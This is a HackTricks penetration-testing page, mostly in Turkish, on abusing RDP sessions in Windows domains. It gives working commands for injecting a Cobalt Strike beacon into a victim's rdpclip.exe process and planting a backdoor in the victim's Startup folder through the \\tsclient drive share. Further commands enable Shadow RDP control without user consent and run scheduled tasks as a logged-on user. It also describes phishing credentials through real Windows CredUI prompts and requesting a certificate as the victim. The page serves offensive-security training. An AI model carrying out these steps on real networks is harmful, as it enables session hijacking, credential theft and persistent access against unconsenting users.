# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Eğer **external group** mevcut alanda herhangi bir **computer**'a **RDP access**'e sahipse, bir **attacker** o **compromise that computer and wait for him**.

Kullanıcı RDP ile bağlandıktan sonra, **attacker can pivot to that users session** ve harici alandaki izinlerini kötüye kullanabilir.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Diğer araçlarla oturum çalmanın diğer yollarına göz atın [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Bir kullanıcı, **RDP into a machine** aracılığıyla kendisini bekleyen bir **attacker**'ın bulunduğu bir makineye erişirse, **attacker** kullanıcının **inject a beacon in the RDP session of the user** yapabilecek ve eğer **victim mounted his drive** ise, **attacker could access it**.

Bu durumda sadece **victims** **original computer**'ı **compromise** edebilir ve **statup folder**'a bir **backdoor** yazarak ele geçirebilirsiniz.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Eğer hedefin zaten bir **active RDP session** içinde olduğu bir host'ta **local admin** iseniz, o masaüstünü **view/control** edebilmeniz mümkün olabilir; bunun için password çalmaya veya **dumping LSASS** yapmaya gerek yoktur.

Bu, şu konumda saklanan **Remote Desktop Services shadowing** politikasına bağlıdır:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
İlginç değerler:

- `0`: Devre dışı
- `1`: `EnableInputNotify` (kontrol, kullanıcı onayı gerekli)
- `2`: `EnableInputNoNotify` (kontrol, **kullanıcı onayı yok**)
- `3`: `EnableNoInputNotify` (yalnızca görüntüleme, kullanıcı onayı gerekli)
- `4`: `EnableNoInputNoNotify` (yalnızca görüntüleme, **kullanıcı onayı yok**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Bu, ayrıcalıklı bir kullanıcının RDP üzerinden bağlandıktan sonra kilidi açık bir masaüstü, KeePass oturumu, MMC konsolu, tarayıcı oturumu veya admin shell bırakması durumunda özellikle kullanışlıdır.

## Oturum Açmış Kullanıcı Olarak Zamanlanmış Görevler

Eğer siz **local admin** iseniz ve hedef kullanıcı **şu anda oturum açmış** ise, Task Scheduler o kullanıcının parolası olmadan kodu **parolası olmadan o kullanıcı olarak** başlatabilir.

Bu, kurbanın mevcut oturumunu bir yürütme ilkeline dönüştürür:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notlar:

- Eğer kullanıcı **oturum açmamışsa**, Windows genellikle o kullanıcı olarak çalışan bir görev oluşturmak için parola ister.
- Eğer kullanıcı **oturum açmışsa**, görev mevcut oturum bağlamını yeniden kullanabilir.
- Bu, LSASS'e dokunmadan kurban oturumunda GUI işlemleri gerçekleştirmek veya binary'ler başlatmak için pratik bir yoldur.

## Kurban Oturumundan CredUI Uyarı Penceresi Kötüye Kullanımı

Kurbanın etkileşimli masaüstü içinde (ör. **Shadow RDP** veya **o kullanıcı olarak çalışan bir zamanlanmış görev** aracılığıyla) yürütme yapabildiğinizde, CredUI API'lerini kullanarak **gerçek bir Windows kimlik doğrulama istemi** gösterebilir ve kurbanın girdiği kimlik bilgilerini toplayabilirsiniz.

İlgili API'ler:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipik akış:

1. Kurban oturumunda bir binary başlatın.
2. Mevcut domain markalamasına uyan bir domain kimlik doğrulama istemi gösterin.
3. Dönen auth buffer'ı unpack edin.
4. Sağlanan kimlik bilgilerini doğrulayın ve isteğe bağlı olarak geçerli kimlik bilgileri girilene kadar istemi tekrar gösterin.

Bu, on-host phishing için faydalıdır çünkü istem standart Windows API'leri tarafından gösterilir; sahte bir HTML formu yerine gerçek bir Windows penceresi gösterilir.

## Kurban Bağlamında PFX Talep Etme

Aynı scheduled-task-as-user primitive, oturum açmış kurban adına certificate/PFX talep etmek için kullanılabilir. Bu sertifika daha sonra parola hırsızlığına gerek kalmadan o kullanıcı olarak AD authentication için kullanılabilir.

Yüksek seviye akış:

1. Kurbanın oturum açtığı bir hostta local admin hakları edinin.
2. Enrollment/export mantığını kurban olarak bir scheduled task ile çalıştırın.
3. Ortaya çıkan PFX'i dışa aktarın.
4. PFX'i PKINIT / sertifika tabanlı AD authentication için kullanın.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
